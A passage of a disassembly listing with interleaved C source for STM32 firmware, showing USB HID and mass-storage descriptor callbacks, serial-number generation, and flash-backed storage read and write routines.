 800c62c:	4803      	ldr	r0, [pc, #12]	; (800c63c <CUSTOM_HID_OutEvent_FS+0x20>)
 800c62e:	f7fc fbd1 	bl	8008dd4 <USBD_CUSTOM_HID_ReceivePacket>

  return (USBD_OK);
 800c632:	2300      	movs	r3, #0
  /* USER CODE END 6 */
}
 800c634:	4618      	mov	r0, r3
 800c636:	3708      	adds	r7, #8
 800c638:	46bd      	mov	sp, r7
 800c63a:	bd80      	pop	{r7, pc}
 800c63c:	200003c0 	.word	0x200003c0

0800c640 <USBD_FS_DeviceDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_DeviceDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c640:	b480      	push	{r7}
 800c642:	b083      	sub	sp, #12
 800c644:	af00      	add	r7, sp, #0
 800c646:	4603      	mov	r3, r0
 800c648:	6039      	str	r1, [r7, #0]
 800c64a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c64c:	683b      	ldr	r3, [r7, #0]
 800c64e:	2212      	movs	r2, #18
 800c650:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c652:	4b06      	ldr	r3, [pc, #24]	; (800c66c <USBD_FS_DeviceDescriptor+0x2c>)
 800c654:	681b      	ldr	r3, [r3, #0]
 800c656:	2b01      	cmp	r3, #1
 800c658:	d101      	bne.n	800c65e <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c65a:	4b05      	ldr	r3, [pc, #20]	; (800c670 <USBD_FS_DeviceDescriptor+0x30>)
 800c65c:	e000      	b.n	800c660 <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c65e:	4b05      	ldr	r3, [pc, #20]	; (800c674 <USBD_FS_DeviceDescriptor+0x34>)
}
 800c660:	4618      	mov	r0, r3
 800c662:	370c      	adds	r7, #12
 800c664:	46bd      	mov	sp, r7
 800c666:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c66a:	4770      	bx	lr
 800c66c:	20000978 	.word	0x20000978
 800c670:	200001cc 	.word	0x200001cc
 800c674:	200001e0 	.word	0x200001e0

0800c678 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c678:	b480      	push	{r7}
 800c67a:	b083      	sub	sp, #12
 800c67c:	af00      	add	r7, sp, #0
 800c67e:	4603      	mov	r3, r0
 800c680:	6039      	str	r1, [r7, #0]
 800c682:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c684:	683b      	ldr	r3, [r7, #0]
 800c686:	2204      	movs	r2, #4
 800c688:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c68a:	4b03      	ldr	r3, [pc, #12]	; (800c698 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c68c:	4618      	mov	r0, r3
 800c68e:	370c      	adds	r7, #12
 800c690:	46bd      	mov	sp, r7
 800c692:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c696:	4770      	bx	lr
 800c698:	20000200 	.word	0x20000200

0800c69c <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c69c:	b580      	push	{r7, lr}
 800c69e:	b082      	sub	sp, #8
 800c6a0:	af00      	add	r7, sp, #0
 800c6a2:	4603      	mov	r3, r0
 800c6a4:	6039      	str	r1, [r7, #0]
 800c6a6:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c6a8:	79fb      	ldrb	r3, [r7, #7]
 800c6aa:	2b00      	cmp	r3, #0
 800c6ac:	d105      	bne.n	800c6ba <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c6ae:	683a      	ldr	r2, [r7, #0]
 800c6b0:	4907      	ldr	r1, [pc, #28]	; (800c6d0 <USBD_FS_ProductStrDescriptor+0x34>)
 800c6b2:	4808      	ldr	r0, [pc, #32]	; (800c6d4 <USBD_FS_ProductStrDescriptor+0x38>)
 800c6b4:	f7ff fe62 	bl	800c37c <USBD_GetString>
 800c6b8:	e004      	b.n	800c6c4 <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c6ba:	683a      	ldr	r2, [r7, #0]
 800c6bc:	4904      	ldr	r1, [pc, #16]	; (800c6d0 <USBD_FS_ProductStrDescriptor+0x34>)
 800c6be:	4805      	ldr	r0, [pc, #20]	; (800c6d4 <USBD_FS_ProductStrDescriptor+0x38>)
 800c6c0:	f7ff fe5c 	bl	800c37c <USBD_GetString>
  }
  return USBD_StrDesc;
 800c6c4:	4b02      	ldr	r3, [pc, #8]	; (800c6d0 <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c6c6:	4618      	mov	r0, r3
 800c6c8:	3708      	adds	r7, #8
 800c6ca:	46bd      	mov	sp, r7
 800c6cc:	bd80      	pop	{r7, pc}
 800c6ce:	bf00      	nop
 800c6d0:	2000097c 	.word	0x2000097c
 800c6d4:	0800d3cc 	.word	0x0800d3cc

0800c6d8 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c6d8:	b580      	push	{r7, lr}
 800c6da:	b082      	sub	sp, #8
 800c6dc:	af00      	add	r7, sp, #0
 800c6de:	4603      	mov	r3, r0
 800c6e0:	6039      	str	r1, [r7, #0]
 800c6e2:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c6e4:	683a      	ldr	r2, [r7, #0]
 800c6e6:	4904      	ldr	r1, [pc, #16]	; (800c6f8 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c6e8:	4804      	ldr	r0, [pc, #16]	; (800c6fc <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c6ea:	f7ff fe47 	bl	800c37c <USBD_GetString>
  return USBD_StrDesc;
 800c6ee:	4b02      	ldr	r3, [pc, #8]	; (800c6f8 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c6f0:	4618      	mov	r0, r3
 800c6f2:	3708      	adds	r7, #8
 800c6f4:	46bd      	mov	sp, r7
 800c6f6:	bd80      	pop	{r7, pc}
 800c6f8:	2000097c 	.word	0x2000097c
 800c6fc:	0800d3e0 	.word	0x0800d3e0

0800c700 <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c700:	b580      	push	{r7, lr}
 800c702:	b082      	sub	sp, #8
 800c704:	af00      	add	r7, sp, #0
 800c706:	4603      	mov	r3, r0
 800c708:	6039      	str	r1, [r7, #0]
 800c70a:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c70c:	683b      	ldr	r3, [r7, #0]
 800c70e:	221a      	movs	r2, #26
 800c710:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c712:	f000 f855 	bl	800c7c0 <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c716:	4b02      	ldr	r3, [pc, #8]	; (800c720 <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c718:	4618      	mov	r0, r3
 800c71a:	3708      	adds	r7, #8
 800c71c:	46bd      	mov	sp, r7
 800c71e:	bd80      	pop	{r7, pc}
 800c720:	20000204 	.word	0x20000204

0800c724 <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c724:	b580      	push	{r7, lr}
 800c726:	b082      	sub	sp, #8
 800c728:	af00      	add	r7, sp, #0
 800c72a:	4603      	mov	r3, r0
 800c72c:	6039      	str	r1, [r7, #0]
 800c72e:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c730:	79fb      	ldrb	r3, [r7, #7]
 800c732:	2b00      	cmp	r3, #0
 800c734:	d105      	bne.n	800c742 <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c736:	683a      	ldr	r2, [r7, #0]
 800c738:	4907      	ldr	r1, [pc, #28]	; (800c758 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c73a:	4808      	ldr	r0, [pc, #32]	; (800c75c <USBD_FS_ConfigStrDescriptor+0x38>)
 800c73c:	f7ff fe1e 	bl	800c37c <USBD_GetString>
 800c740:	e004      	b.n	800c74c <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c742:	683a      	ldr	r2, [r7, #0]
 800c744:	4904      	ldr	r1, [pc, #16]	; (800c758 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c746:	4805      	ldr	r0, [pc, #20]	; (800c75c <USBD_FS_ConfigStrDescriptor+0x38>)
 800c748:	f7ff fe18 	bl	800c37c <USBD_GetString>
  }
  return USBD_StrDesc;
 800c74c:	4b02      	ldr	r3, [pc, #8]	; (800c758 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c74e:	4618      	mov	r0, r3
 800c750:	3708      	adds	r7, #8
 800c752:	46bd      	mov	sp, r7
 800c754:	bd80      	pop	{r7, pc}
 800c756:	bf00      	nop
 800c758:	2000097c 	.word	0x2000097c
 800c75c:	0800d3e4 	.word	0x0800d3e4

0800c760 <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c760:	b580      	push	{r7, lr}
 800c762:	b082      	sub	sp, #8
 800c764:	af00      	add	r7, sp, #0
 800c766:	4603      	mov	r3, r0
 800c768:	6039      	str	r1, [r7, #0]
 800c76a:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c76c:	79fb      	ldrb	r3, [r7, #7]
 800c76e:	2b00      	cmp	r3, #0
 800c770:	d105      	bne.n	800c77e <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c772:	683a      	ldr	r2, [r7, #0]
 800c774:	4907      	ldr	r1, [pc, #28]	; (800c794 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c776:	4808      	ldr	r0, [pc, #32]	; (800c798 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c778:	f7ff fe00 	bl	800c37c <USBD_GetString>
 800c77c:	e004      	b.n	800c788 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c77e:	683a      	ldr	r2, [r7, #0]
 800c780:	4904      	ldr	r1, [pc, #16]	; (800c794 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c782:	4805      	ldr	r0, [pc, #20]	; (800c798 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c784:	f7ff fdfa 	bl	800c37c <USBD_GetString>
  }
  return USBD_StrDesc;
 800c788:	4b02      	ldr	r3, [pc, #8]	; (800c794 <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c78a:	4618      	mov	r0, r3
 800c78c:	3708      	adds	r7, #8
 800c78e:	46bd      	mov	sp, r7
 800c790:	bd80      	pop	{r7, pc}
 800c792:	bf00      	nop
 800c794:	2000097c 	.word	0x2000097c
 800c798:	0800d3f0 	.word	0x0800d3f0

0800c79c <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c79c:	b480      	push	{r7}
 800c79e:	b083      	sub	sp, #12
 800c7a0:	af00      	add	r7, sp, #0
 800c7a2:	4603      	mov	r3, r0
 800c7a4:	6039      	str	r1, [r7, #0]
 800c7a6:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c7a8:	683b      	ldr	r3, [r7, #0]
 800c7aa:	220c      	movs	r2, #12
 800c7ac:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c7ae:	4b03      	ldr	r3, [pc, #12]	; (800c7bc <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c7b0:	4618      	mov	r0, r3
 800c7b2:	370c      	adds	r7, #12
 800c7b4:	46bd      	mov	sp, r7
 800c7b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c7ba:	4770      	bx	lr
 800c7bc:	200001f4 	.word	0x200001f4

0800c7c0 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c7c0:	b580      	push	{r7, lr}
 800c7c2:	b084      	sub	sp, #16
 800c7c4:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c7c6:	4b0f      	ldr	r3, [pc, #60]	; (800c804 <Get_SerialNum+0x44>)
 800c7c8:	681b      	ldr	r3, [r3, #0]
 800c7ca:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c7cc:	4b0e      	ldr	r3, [pc, #56]	; (800c808 <Get_SerialNum+0x48>)
 800c7ce:	681b      	ldr	r3, [r3, #0]
 800c7d0:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c7d2:	4b0e      	ldr	r3, [pc, #56]	; (800c80c <Get_SerialNum+0x4c>)
 800c7d4:	681b      	ldr	r3, [r3, #0]
 800c7d6:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c7d8:	68fa      	ldr	r2, [r7, #12]
 800c7da:	687b      	ldr	r3, [r7, #4]
 800c7dc:	4413      	add	r3, r2
 800c7de:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c7e0:	68fb      	ldr	r3, [r7, #12]
 800c7e2:	2b00      	cmp	r3, #0
 800c7e4:	d009      	beq.n	800c7fa <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c7e6:	2208      	movs	r2, #8
 800c7e8:	4909      	ldr	r1, [pc, #36]	; (800c810 <Get_SerialNum+0x50>)
 800c7ea:	68f8      	ldr	r0, [r7, #12]
 800c7ec:	f000 f814 	bl	800c818 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c7f0:	2204      	movs	r2, #4
 800c7f2:	4908      	ldr	r1, [pc, #32]	; (800c814 <Get_SerialNum+0x54>)
 800c7f4:	68b8      	ldr	r0, [r7, #8]
 800c7f6:	f000 f80f 	bl	800c818 <IntToUnicode>
  }
}
 800c7fa:	bf00      	nop
 800c7fc:	3710      	adds	r7, #16
 800c7fe:	46bd      	mov	sp, r7
 800c800:	bd80      	pop	{r7, pc}
 800c802:	bf00      	nop
 800c804:	1fff7590 	.word	0x1fff7590
 800c808:	1fff7594 	.word	0x1fff7594
 800c80c:	1fff7598 	.word	0x1fff7598
 800c810:	20000206 	.word	0x20000206
 800c814:	20000216 	.word	0x20000216

0800c818 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c818:	b480      	push	{r7}
 800c81a:	b087      	sub	sp, #28
 800c81c:	af00      	add	r7, sp, #0
 800c81e:	60f8      	str	r0, [r7, #12]
 800c820:	60b9      	str	r1, [r7, #8]
 800c822:	4613      	mov	r3, r2
 800c824:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c826:	2300      	movs	r3, #0
 800c828:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c82a:	2300      	movs	r3, #0
 800c82c:	75fb      	strb	r3, [r7, #23]
 800c82e:	e027      	b.n	800c880 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c830:	68fb      	ldr	r3, [r7, #12]
 800c832:	0f1b      	lsrs	r3, r3, #28
 800c834:	2b09      	cmp	r3, #9
 800c836:	d80b      	bhi.n	800c850 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c838:	68fb      	ldr	r3, [r7, #12]
 800c83a:	0f1b      	lsrs	r3, r3, #28
 800c83c:	b2da      	uxtb	r2, r3
 800c83e:	7dfb      	ldrb	r3, [r7, #23]
 800c840:	005b      	lsls	r3, r3, #1
 800c842:	4619      	mov	r1, r3
 800c844:	68bb      	ldr	r3, [r7, #8]
 800c846:	440b      	add	r3, r1
 800c848:	3230      	adds	r2, #48	; 0x30
 800c84a:	b2d2      	uxtb	r2, r2
 800c84c:	701a      	strb	r2, [r3, #0]
 800c84e:	e00a      	b.n	800c866 <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c850:	68fb      	ldr	r3, [r7, #12]
 800c852:	0f1b      	lsrs	r3, r3, #28
 800c854:	b2da      	uxtb	r2, r3
 800c856:	7dfb      	ldrb	r3, [r7, #23]
 800c858:	005b      	lsls	r3, r3, #1
 800c85a:	4619      	mov	r1, r3
 800c85c:	68bb      	ldr	r3, [r7, #8]
 800c85e:	440b      	add	r3, r1
 800c860:	3237      	adds	r2, #55	; 0x37
 800c862:	b2d2      	uxtb	r2, r2
 800c864:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c866:	68fb      	ldr	r3, [r7, #12]
 800c868:	011b      	lsls	r3, r3, #4
 800c86a:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c86c:	7dfb      	ldrb	r3, [r7, #23]
 800c86e:	005b      	lsls	r3, r3, #1
 800c870:	3301      	adds	r3, #1
 800c872:	68ba      	ldr	r2, [r7, #8]
 800c874:	4413      	add	r3, r2
 800c876:	2200      	movs	r2, #0
 800c878:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c87a:	7dfb      	ldrb	r3, [r7, #23]
 800c87c:	3301      	adds	r3, #1
 800c87e:	75fb      	strb	r3, [r7, #23]
 800c880:	7dfa      	ldrb	r2, [r7, #23]
 800c882:	79fb      	ldrb	r3, [r7, #7]
 800c884:	429a      	cmp	r2, r3
 800c886:	d3d3      	bcc.n	800c830 <IntToUnicode+0x18>
  }
}
 800c888:	bf00      	nop
 800c88a:	bf00      	nop
 800c88c:	371c      	adds	r7, #28
 800c88e:	46bd      	mov	sp, r7
 800c890:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c894:	4770      	bx	lr

0800c896 <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c896:	b480      	push	{r7}
 800c898:	b083      	sub	sp, #12
 800c89a:	af00      	add	r7, sp, #0
 800c89c:	4603      	mov	r3, r0
 800c89e:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c8a0:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c8a2:	4618      	mov	r0, r3
 800c8a4:	370c      	adds	r7, #12
 800c8a6:	46bd      	mov	sp, r7
 800c8a8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c8ac:	4770      	bx	lr

0800c8ae <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c8ae:	b480      	push	{r7}
 800c8b0:	b085      	sub	sp, #20
 800c8b2:	af00      	add	r7, sp, #0
 800c8b4:	4603      	mov	r3, r0
 800c8b6:	60b9      	str	r1, [r7, #8]
 800c8b8:	607a      	str	r2, [r7, #4]
 800c8ba:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c8bc:	68bb      	ldr	r3, [r7, #8]
 800c8be:	2240      	movs	r2, #64	; 0x40
 800c8c0:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c8c2:	687b      	ldr	r3, [r7, #4]
 800c8c4:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c8c8:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c8ca:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c8cc:	4618      	mov	r0, r3
 800c8ce:	3714      	adds	r7, #20
 800c8d0:	46bd      	mov	sp, r7
 800c8d2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c8d6:	4770      	bx	lr

0800c8d8 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c8d8:	b480      	push	{r7}
 800c8da:	b083      	sub	sp, #12
 800c8dc:	af00      	add	r7, sp, #0
 800c8de:	4603      	mov	r3, r0
 800c8e0:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c8e2:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c8e4:	4618      	mov	r0, r3
 800c8e6:	370c      	adds	r7, #12
 800c8e8:	46bd      	mov	sp, r7
 800c8ea:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c8ee:	4770      	bx	lr

0800c8f0 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c8f0:	b480      	push	{r7}
 800c8f2:	b083      	sub	sp, #12
 800c8f4:	af00      	add	r7, sp, #0
 800c8f6:	4603      	mov	r3, r0
 800c8f8:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c8fa:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c8fc:	4618      	mov	r0, r3
 800c8fe:	370c      	adds	r7, #12
 800c900:	46bd      	mov	sp, r7
 800c902:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c906:	4770      	bx	lr

0800c908 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c908:	b580      	push	{r7, lr}
 800c90a:	b084      	sub	sp, #16
 800c90c:	af00      	add	r7, sp, #0
 800c90e:	60b9      	str	r1, [r7, #8]
 800c910:	607a      	str	r2, [r7, #4]
 800c912:	461a      	mov	r2, r3
 800c914:	4603      	mov	r3, r0
 800c916:	73fb      	strb	r3, [r7, #15]
 800c918:	4613      	mov	r3, r2
 800c91a:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c91c:	7bfb      	ldrb	r3, [r7, #15]
 800c91e:	2b00      	cmp	r3, #0
 800c920:	d10d      	bne.n	800c93e <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c922:	687b      	ldr	r3, [r7, #4]
 800c924:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c928:	3340      	adds	r3, #64	; 0x40
 800c92a:	02db      	lsls	r3, r3, #11
 800c92c:	4619      	mov	r1, r3
 800c92e:	89bb      	ldrh	r3, [r7, #12]
 800c930:	02db      	lsls	r3, r3, #11
 800c932:	461a      	mov	r2, r3
 800c934:	68b8      	ldr	r0, [r7, #8]
 800c936:	f000 fc65 	bl	800d204 <memcpy>
		return (USBD_OK);
 800c93a:	2300      	movs	r3, #0
 800c93c:	e000      	b.n	800c940 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c93e:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c940:	4618      	mov	r0, r3
 800c942:	3710      	adds	r7, #16
 800c944:	46bd      	mov	sp, r7
 800c946:	bd80      	pop	{r7, pc}

0800c948 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c948:	b580      	push	{r7, lr}
 800c94a:	b08a      	sub	sp, #40	; 0x28
 800c94c:	af00      	add	r7, sp, #0
 800c94e:	60b9      	str	r1, [r7, #8]
 800c950:	607a      	str	r2, [r7, #4]
 800c952:	461a      	mov	r2, r3
 800c954:	4603      	mov	r3, r0
 800c956:	73fb      	strb	r3, [r7, #15]
 800c958:	4613      	mov	r3, r2
 800c95a:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c95c:	7bfb      	ldrb	r3, [r7, #15]
 800c95e:	2b00      	cmp	r3, #0
 800c960:	d136      	bne.n	800c9d0 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c962:	f7f4 febb 	bl	80016dc <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c966:	2300      	movs	r3, #0
 800c968:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c96a:	2301      	movs	r3, #1
 800c96c:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c96e:	687b      	ldr	r3, [r7, #4]
 800c970:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c974:	3340      	adds	r3, #64	; 0x40
 800c976:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c97a:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c97c:	89bb      	ldrh	r3, [r7, #12]
 800c97e:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c980:	2300      	movs	r3, #0
 800c982:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c984:	f107 0210 	add.w	r2, r7, #16
 800c988:	f107 0314 	add.w	r3, r7, #20
 800c98c:	4611      	mov	r1, r2
 800c98e:	4618      	mov	r0, r3
 800c990:	f7f4 ff8a 	bl	80018a8 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c994:	2300      	movs	r3, #0
 800c996:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c998:	e011      	b.n	800c9be <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c99a:	687b      	ldr	r3, [r7, #4]
 800c99c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c9a0:	3340      	adds	r3, #64	; 0x40
 800c9a2:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c9a4:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c9a6:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c9a8:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c9aa:	68ba      	ldr	r2, [r7, #8]
 800c9ac:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c9ae:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c9b2:	2000      	movs	r0, #0
 800c9b4:	f7f4 fe26 	bl	8001604 <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c9b8:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c9ba:	3308      	adds	r3, #8
 800c9bc:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c9be:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c9c0:	89bb      	ldrh	r3, [r7, #12]
 800c9c2:	02db      	lsls	r3, r3, #11
